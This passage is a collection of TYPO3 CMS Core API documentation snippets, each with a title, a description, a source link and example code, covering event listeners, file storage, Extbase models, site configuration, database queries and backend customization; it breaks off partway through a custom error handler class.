https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FileUpload.rst#2025-04-16_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nFileReader()\n```\n\n----------------------------------------\n\nTITLE: Inline If ViewHelper for Dynamic Classes\nDESCRIPTION: Shows how to use the if ViewHelper with inline notation to dynamically set CSS classes based on conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_23\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"{f:if(condition: blog.posts, then: 'blogPostsAvailable', else: 'noPosts')}\">\n  ...\n</div>\n```\n\n----------------------------------------\n\nTITLE: Adding Files to Default Storage in TYPO3 FAL\nDESCRIPTION: Example of adding a new file to the default storage location.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileFolder.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$resourceFactory = \\TYPO3\\CMS\\Core\\Resource\\ResourceFactory::getInstance();\n$storage = $resourceFactory->getDefaultStorage();\n$newFile = $storage->addFile(\n    '/tmp/temporary_file.ext',\n    $storage->getRootLevelFolder(),\n    'final_file_name.ext'\n);\n```\n\n----------------------------------------\n\nTITLE: Configuring Asset Routes in TYPO3 CMS YAML\nDESCRIPTION: This snippet shows how to configure static routes to expose assets, typically located in the Resources/Public/ directory of an extension. It allows reaching files like example.svg and favicon.ico directly from the site root.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/StaticRoutes.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nroutes:\n  - route: example.svg\n    type: assets\n    source: 'EXT:my_extension/Resources/Public/Assets/example.svg'\n  - route: favicon.ico\n    type: assets\n    source: 'EXT:my_extension/Resources/Public/Icons/favicon.ico'\n```\n\n----------------------------------------\n\nTITLE: Implementing BeforeTcaOverridesEvent Listener in TYPO3 PHP\nDESCRIPTION: Example of an event listener implementation for the BeforeTcaOverridesEvent in TYPO3. This allows dynamically generating TCA before TCA overrides are applied, which is useful for TCA generator extensions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Configuration/BeforeTcaOverridesEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Configuration\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Configuration\\Event\\BeforeTcaOverridesEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforeTcaOverridesEvent $event): void\n    {\n        // Get current TCA\n        $tca = $event->getTca();\n        \n        // Add dynamic base TCA for my specific thing, here using a\n        // dedicated custom helper to add dynamic pages TCA\n        $tca = $this->addDynamicBaseTca($tca);\n        \n        // Set changed TCA\n        $event->setTca($tca);\n    }\n    \n    private function addDynamicBaseTca(array $tca): array\n    {\n        // Do your thing here\n        return $tca;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Instantiating a Service in TYPO3 CMS using GeneralUtility\nDESCRIPTION: Shows how to instantiate a service using the Services API in TYPO3 CMS. This method uses GeneralUtility::makeInstanceService and identifies a service by its type, subtype, and exclude service keys.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Introduction/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\n$serviceObject = GeneralUtility::makeInstanceService(\n   'my_service_type',\n   'my_service_subtype',\n   ['not_used_service_type1', 'not_used_service_type2']\n);\n```\n\n----------------------------------------\n\nTITLE: Using AfterResourceStorageInitializationEvent in TYPO3 CMS\nDESCRIPTION: Example of the AfterResourceStorageInitializationEvent PHP class in TYPO3 CMS. This event is fired after a resource storage object has been initialized, allowing developers to perform additional operations on the storage.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterResourceStorageInitializationEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class AfterResourceStorageInitializationEvent\n{\n    private ResourceStorage $storage;\n\n    public function __construct(ResourceStorage $storage)\n    {\n        $this->storage = $storage;\n    }\n\n    public function getStorage(): ResourceStorage\n    {\n        return $this->storage;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing All Properties for a Specific Manager in PHP\nDESCRIPTION: Shows how to remove all previously set meta tags for a specific manager using the MetaTag API.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/MetaTagApi.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\MetaTag\\MetaTagManagerRegistry;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\n$metaTagManager = GeneralUtility::makeInstance(MetaTagManagerRegistry::class)->getManagerForProperty('og:title');\n$metaTagManager->removeAllProperties();\n```\n\n----------------------------------------\n\nTITLE: Implementing Ajax Controller for Custom Field Control in TYPO3\nDESCRIPTION: This PHP class implements the Ajax controller for the custom field control in TYPO3. It defines the importDataAction method which handles the Ajax request for data import.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_13\n\nLANGUAGE: php\nCODE:\n```\nnamespace MyVendor\\MyExtension\\Controller\\Ajax;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Core\\Http\\JsonResponse;\n\nclass ImportDataController\n{\n    public function importDataAction(ServerRequestInterface $request): ResponseInterface\n    {\n        $queryParams = $request->getQueryParams();\n        $id = $queryParams['id'] ?? 0;\n\n        // Perform import logic here\n\n        $result = [\n            'success' => true,\n            'id' => $id\n        ];\n        return new JsonResponse($result);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Selenium Chrome Container with DDEV\nDESCRIPTION: This YAML configuration file sets up a Selenium Chrome container using Docker Compose as part of a DDEV environment. The container is configured to expose services to the DDEV router, which is essential for running acceptance tests with Selenium.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Acceptance.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nversion: '3.6'\nservices:\n  selenium:\n    container_name: ddev-${DDEV_SITENAME}-chrome\n    image: selenium/standalone-chrome:3.12\n    environment:\n      - VIRTUAL_HOST=$DDEV_HOSTNAME\n      - HTTP_EXPOSE=4444\n    external_links:\n      - ddev-router:$DDEV_HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Implementing Blog Model with Required Constructor Parameter in Extbase\nDESCRIPTION: This code shows how to implement a Blog model with a required title parameter in the constructor, demonstrating domain rule enforcement in Extbase models.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Domain/Model.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nnamespace MyVendor\\MyExtension\\Domain\\Model;\n\nuse TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage;\n\nclass Blog extends \\TYPO3\\CMS\\Extbase\\DomainObject\\AbstractEntity\n{\n    /**\n     * @var string\n     */\n    protected $title = '';\n\n    /**\n     * @var \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<\\MyVendor\\MyExtension\\Domain\\Model\\Post>\n     */\n    protected $posts;\n\n    public function __construct(string $title)\n    {\n        $this->title = $title;\n        $this->posts = new ObjectStorage();\n    }\n\n    public function getTitle(): string\n    {\n        return $this->title;\n    }\n\n    // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Database Connection as a Service in TYPO3\nDESCRIPTION: YAML configuration for making a specific database connection available as a service through Dependency Injection. This allows injecting database connections for specific tables directly into classes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  _defaults:\n    autowire: true\n    autoconfigure: true\n    public: false\n\n  MyVendor\\MyExtension\\:\n    resource: '../Classes/*'\n\n  # Configure the connection to tx_myextension_domain_model_mytable as a service\n  tx_myextension_domain_model_mytable.connection:\n    class: TYPO3\\CMS\\Core\\Database\\Connection\n    factory:\n      - '@TYPO3\\CMS\\Core\\Database\\ConnectionPool'\n      - 'getConnectionForTable'\n    arguments:\n      - 'tx_myextension_domain_model_mytable'\n\n```\n\n----------------------------------------\n\nTITLE: Accessing Group Settings from SiteSettings\nDESCRIPTION: Shows how to retrieve all settings for a specific configuration group from SiteSettings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/AccessingSiteConfiguration.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$allSettingsRelatedToRedirects = $siteSettings->get('redirects');\n```\n\n----------------------------------------\n\nTITLE: Property Mapping String to Tag Object in TYPO3 Controller\nDESCRIPTION: Demonstrates how to use TYPO3's property mapper to convert a string input into a Tag domain model object. The method accepts a string parameter and maps it to the 'name' property of a Tag object using the property mapper service.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/PropertyManager/ObjectMapping.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse T3docs\\BlogExample\\Domain\\Model\\Tag;\nuse TYPO3\\CMS\\Extbase\\Property\\Exception;\n\nclass PostController extends AbstractController\n{\n    /**\n     * This method demonstrates property mapping to an object\n     * @throws Exception\n     */\n    protected function mapTagFromString(string $tagString = 'some tag'): Tag\n    {\n        $input = [\n            'name' => $tagString,\n        ];\n        return $this->propertyMapper->convert(\n            $input,\n            Tag::class,\n        );\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Verifying Offline Workspace in TYPO3 PHP\nDESCRIPTION: This snippet illustrates how to determine if the current workspace is offline using the Context API. The 'isOffline' property returns a boolean value indicating whether the workspace is offline.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Context/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n$this->context->getPropertyFromAspect('workspace', 'isOffline');\n```\n\n----------------------------------------\n\nTITLE: Exception Handler Registration in TYPO3 Configuration\nDESCRIPTION: Example of registering a custom exception handler in TYPO3's system configuration file to customize error handling behavior\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtLocalconf.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['debugExceptionHandler'] =\n    \\Vendor\\Ext\\Error\\PostExceptionsOnTwitter::class;\n```\n\n----------------------------------------\n\nTITLE: Using BeforeFileRenamedEvent in TYPO3\nDESCRIPTION: The BeforeFileRenamedEvent is fired by TYPO3's core system before a file is renamed. This event allows developers to implement custom file renaming logic by creating event listeners.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/BeforeFileRenamedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\BeforeFileRenamedEvent\n```\n\n----------------------------------------\n\nTITLE: Creating TYPO3 Backend Users via Console Command in Classic Installation\nDESCRIPTION: Command for creating a new backend user in TYPO3 when using a classic (non-Composer) installation. This starts an interactive prompt for user creation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/UserSetup/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 typo3 backend:user:create\n```\n\n----------------------------------------\n\nTITLE: Custom Login Provider Implementation for TYPO3 v13\nDESCRIPTION: Example implementation of a custom login provider showing both deprecated render() method and new modifyView() method with template configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/LoginProvider.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nnamespace MyVendor\\MyExtension\\Login;\n\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Backend\\LoginProvider\\LoginProviderInterface;\nuse TYPO3\\CMS\\Core\\Page\\PageRenderer;\nuse TYPO3\\CMS\\Fluid\\View\\StandaloneView;\n\nclass MyLoginProvider implements LoginProviderInterface\n{\n    public function __construct(\n        private readonly PageRenderer $pageRenderer,\n    ) {\n    }\n\n    public function render(StandaloneView $view, PageRenderer $pageRenderer, ServerRequestInterface $request): void\n    {\n        $this->modifyView($view, $request);\n    }\n\n    public function modifyView(StandaloneView $view, ServerRequestInterface $request): void\n    {\n        $templateRootPaths = $view->getRootPaths();\n        $layoutRootPaths = $view->getLayoutRootPaths();\n        $partialRootPaths = $view->getPartialRootPaths();\n        $templateRootPaths[] = 'EXT:my_sitepackage/Resources/Private/Templates';\n        $layoutRootPaths[] = 'EXT:my_sitepackage/Resources/Private/Layouts';\n        $partialRootPaths[] = 'EXT:my_sitepackage/Resources/Private/Partials';\n\n        $this->pageRenderer->loadJavaScriptModule('@myvendor/my-extension/login.js');\n\n        $view->setTemplateRootPaths($templateRootPaths);\n        $view->setLayoutRootPaths($layoutRootPaths);\n        $view->setPartialRootPaths($partialRootPaths);\n        $view->setTemplate('MyLoginForm');\n        $view->assign('foo', 'bar');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Access to Backend Module in TYPO3\nDESCRIPTION: Checks if a backend user has access to a specific module by its key using the check() method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['BE_USER']->check('modules', 'web_list');\n```\n\n----------------------------------------\n\nTITLE: Implementing Blog Model with Recommended Constructor and Initialization Pattern\nDESCRIPTION: This code shows the recommended implementation pattern for Extbase models with proper constructor and initialization method, ensuring objects are properly initialized both on creation and hydration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Domain/Model.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nnamespace MyVendor\\MyExtension\\Domain\\Model;\n\nuse TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage;\n\nclass Blog extends \\TYPO3\\CMS\\Extbase\\DomainObject\\AbstractEntity\n{\n    /**\n     * @var string\n     */\n    protected $title = '';\n\n    /**\n     * @var \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<\\MyVendor\\MyExtension\\Domain\\Model\\Post>\n     */\n    protected $posts;\n\n    public function __construct()\n    {\n        $this->initializeObject();\n    }\n\n    /**\n     * Initializes all ObjectStorage properties\n     * Do not modify this method!\n     * It will be rewritten on each save in the extension builder\n     * You may modify the constructor of this class instead\n     */\n    public function initializeObject(): void\n    {\n        $this->posts = new ObjectStorage();\n    }\n\n    // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring 'proxy' in TYPO3\nDESCRIPTION: This snippet explains how to configure the 'proxy' option for HTTP requests in TYPO3. This allows specifying a proxy server for HTTP requests, either as a single string or as an array for multiple proxies with authentication details. Array configuration must be done in `config/system/additional.php`.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/HTTP.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['HTTP']['proxy']\"\n```\n\n----------------------------------------\n\nTITLE: Registering Connection-Specific Driver Middleware in TYPO3\nDESCRIPTION: Shows how to register a Doctrine DBAL driver middleware for a specific database connection using the recommended configuration schema.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Middleware/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['middlewares']['my-middleware'] = [\n    'target' => \\Vendor\\Extension\\Driver\\MyDriverMiddleware::class,\n    'after' => ['typo3/core/custom-platform-driver-middleware'],\n];\n```\n\n----------------------------------------\n\nTITLE: Configuring Distinct Subdomain for TYPO3 Backend in PHP\nDESCRIPTION: This code snippet shows how to configure a distinct subdomain for the TYPO3 backend entry point and set the cookie domain for cross-domain functionality in the additional.php configuration file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/BackendEntryPoint/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['entryPoint'] = 'https://my-backend-subdomain.example.org';\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['cookieDomain'] = '.example.org';\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 ConnectionPool Class in PHP\nDESCRIPTION: The fully qualified class name for the TYPO3 ConnectionPool class, which is the main entry point for extensions to retrieve database connections.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ClassOverview/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nTYPO3\\CMS\\Core\\Database\\ConnectionPool\n```\n\n----------------------------------------\n\nTITLE: Defining RenderAdditionalContentToRecordListEvent Class Methods\nDESCRIPTION: Defines methods for a TYPO3 event class that handles additional content rendering for record lists. Includes methods for getting the request object, adding content above/below the list, and retrieving the added content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/RenderAdditionalContentToRecordListEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Controller\\Event;\n\nclass RenderAdditionalContentToRecordListEvent\n{\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface;\n    \n    public function addContentAbove(string $contentAbove): void;\n    \n    public function addContentBelow(string $contentBelow): void;\n    \n    public function getAdditionalContentAbove(): string;\n    \n    public function getAdditionalContentBelow(): string;\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Backend Toolbar Items in TYPO3\nDESCRIPTION: Global configuration option to register additional toolbar items in the TYPO3 backend top bar.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/BackendGUI.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['toolbarItems']\n```\n\n----------------------------------------\n\nTITLE: Customizing HTML Responses in TYPO3 Extbase\nDESCRIPTION: This snippet allows passing a custom HTML string directly to the htmlResponse() function in TYPO3 Extbase, enabling the use of templating engines other than Fluid. Ensure that all user inputs are escaped to prevent XSS vulnerabilities.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/View/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n\\include:: /CodeSnippets/Extbase/View/HtmlResponseCustom.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Creating Element Content for MultiStepWizard Slide\nDESCRIPTION: Example of creating content for a MultiStepWizard slide using the Element approach. This creates a DOM element with HTML content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/MultiStepWizard.rst#2025-04-16_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nObject.assign(document.createElement('div'), {\n  innerHTML: 'Your HTML content'\n});\n```\n\n----------------------------------------\n\nTITLE: Event Listener to Remove Plain Slug Source (PHP)\nDESCRIPTION: This event listener demonstrates how to remove the PlainSlugReplacementSource if a PageTypeSource for page type 0 is present and differs from the plain slug source. It modifies the default behavior of keeping both sources.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Redirects/SlugRedirectChangeItemCreatedEvent.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend;\n\nuse TYPO3\\CMS\\Core\\Attribute\\AsEventListener;\nuse TYPO3\\CMS\\Redirects\\Event\\SlugRedirectChangeItemCreatedEvent;\nuse TYPO3\\CMS\\Redirects\\RedirectUpdate\\PageTypeSource;\nuse TYPO3\\CMS\\Redirects\\RedirectUpdate\\PlainSlugReplacementSource;\n\n#[AsEventListener(\n    identifier: 'my-extension/remove-plain-slug-source'\n)]\nfinal class MyEventListener\n{\n    public function __invoke(SlugRedirectChangeItemCreatedEvent $event): void\n    {\n        $sources = $event->getSources();\n        $hasPageTypeZero = false;\n        $hasPlainSlug = false;\n\n        foreach ($sources as $source) {\n            if ($source instanceof PageTypeSource && $source->getPageType() === 0) {\n                $hasPageTypeZero = true;\n            }\n            if ($source instanceof PlainSlugReplacementSource) {\n                $hasPlainSlug = true;\n            }\n            if ($hasPageTypeZero && $hasPlainSlug) {\n                break;\n            }\n        }\n\n        if ($hasPageTypeZero && $hasPlainSlug) {\n            $sources = array_filter(\n                $sources,\n                static fn ($source) => !($source instanceof PlainSlugReplacementSource)\n            );\n            $event->setSources($sources);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Custom SEL Functions in TypoScript\nDESCRIPTION: Examples of using custom Symfony Expression Language functions in TypoScript conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SymfonyExpressionLanguage/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: typoscript\nCODE:\n```\n[webservice('pages', 10)]\n    page.10 >\n    page.10 = TEXT\n    page.10.value = Matched\n[GLOBAL]\n\n# Or compare the result of the function to a string\n[webservice('pages', 10) === 'Expected page title']\n    page.10 >\n    page.10 = TEXT\n    page.10.value = Matched\n[GLOBAL]\n\n# if there are no parameters, your own conditions still need brackets\n[conditionWithoutParameters()]\n    # do something\n[GLOBAL]\n```\n\n----------------------------------------\n\nTITLE: Accessing Site Settings with Dot Notation\nDESCRIPTION: Demonstrates how to access site settings using dot notation with the SiteSettings object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/AccessingSiteConfiguration.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$redirectStatusCodeForRedirects = (int)$siteSettings->get('redirects.httpStatusCode', 307);\n```\n\n----------------------------------------\n\nTITLE: Creating Named Parameters in TYPO3 Query Builder\nDESCRIPTION: Shows proper and improper ways to use createNamedParameter() in QueryBuilder, emphasizing code organization for better security and readability.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_30\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n// DO\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$queryBuilder->getRestrictions()->removeAll();\n$queryBuilder\n    ->select('uid')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq(\n            'bodytext',\n            $queryBuilder->createNamedParameter($searchWord, Connection::PARAM_STR)\n        )\n    )\n\n// DON'T DO, this is much harder to track:\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$myValue = $queryBuilder->createNamedParameter($searchWord);\n// Imagine much more code here\n$queryBuilder->getRestrictions()->removeAll();\n$queryBuilder\n    ->select('uid')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq('bodytext', $myValue)\n    )\n```\n\n----------------------------------------\n\nTITLE: Defining Base Variant Condition in TYPO3 Site Configuration\nDESCRIPTION: Example of a condition using Symfony expression language to define a base variant for the Development application context in TYPO3 site configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/BaseVariants.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\napplicationContext == \"Development\"\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Plugin for Blog Post Display and Comment Creation\nDESCRIPTION: This code configures a TYPO3 plugin named 'PostSingle' for the 'BlogExample' extension. It sets up controller actions for displaying a single post and creating comments, with the comment creation action specified as non-cacheable.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/FrontendPlugins/ConfigurePlugin.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndefined('TYPO3') or die();\n\nuse TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility;\nuse FriendsOfTYPO3\\BlogExample\\Controller\\PostController;\nuse FriendsOfTYPO3\\BlogExample\\Controller\\CommentController;\n\nExtensionUtility::configurePlugin(\n   'BlogExample',\n   'PostSingle',\n   [PostController::class => 'show', CommentController::class => 'create'],\n   [CommentController::class => 'create']\n);\n```\n\n----------------------------------------\n\nTITLE: Registering LinkBrowser Tabs in TYPO3 Page TSconfig\nDESCRIPTION: This snippet demonstrates how to register a custom LinkBrowser tab in TYPO3 using page TSconfig. It shows the configuration structure with handler class, label, display position, scan order, and custom configuration options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/LinkBrowserApi/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEMAIN.linkHandler.<tabIdentifier> {\n    handler = TYPO3\\CMS\\Backend\\LinkHandler\\FileLinkHandler\n    label = LLL:EXT:backend/Resources/Private/Language/locallang_browse_links.xlf:file\n    displayAfter = page\n    scanAfter = page\n    configuration {\n        customConfig = passed to the handler\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Backend Route Information in TYPO3\nDESCRIPTION: Example of retrieving backend routing information from a PSR-7 request object in TYPO3. Demonstrates how to access the RouteResult object and get the route arguments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/Routing.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n/** @var \\Psr\\Http\\Message\\ServerRequestInterface $request */\n$routing = $request->getAttribute('routing');\n$arguments = $routing->getArguments()\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeMailerSentMessageEvent Class in PHP for TYPO3 CMS Core Mail Event\nDESCRIPTION: This snippet defines the BeforeMailerSentMessageEvent class with methods to get and set the message, envelope, and mailer. It allows manipulation of the RawMessage and Envelope before the message is sent by the Mailer.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeMailerSentMessageEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Mail\\Event;\n\nclass BeforeMailerSentMessageEvent\n{\n    public function getMessage(): \\Symfony\\Component\\Mime\\RawMessage\n    {\n        // Implementation not shown\n    }\n\n    public function setMessage(\\Symfony\\Component\\Mime\\RawMessage $message): void\n    {\n        // Implementation not shown\n    }\n\n    public function getEnvelope(): ?\\Symfony\\Component\\Mailer\\Envelope\n    {\n        // Implementation not shown\n    }\n\n    public function setEnvelope(?\\Symfony\\Component\\Mailer\\Envelope $envelope = NULL): void\n    {\n        // Implementation not shown\n    }\n\n    public function getMailer(): \\Symfony\\Component\\Mailer\\MailerInterface\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Error Handler Class in PHP for TYPO3\nDESCRIPTION: This PHP class implements the PageErrorHandlerInterface for a custom 404 error handler in TYPO3. It includes a constructor for initialization and a handlePageError method that generates an HTML response with the error details.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/ErrorHandling/WriteCustomErrorHandler.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace MyVendor\\MySitePackage\\Error;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Core\\Error\\PageErrorHandler\\PageErrorHandlerInterface;\nuse 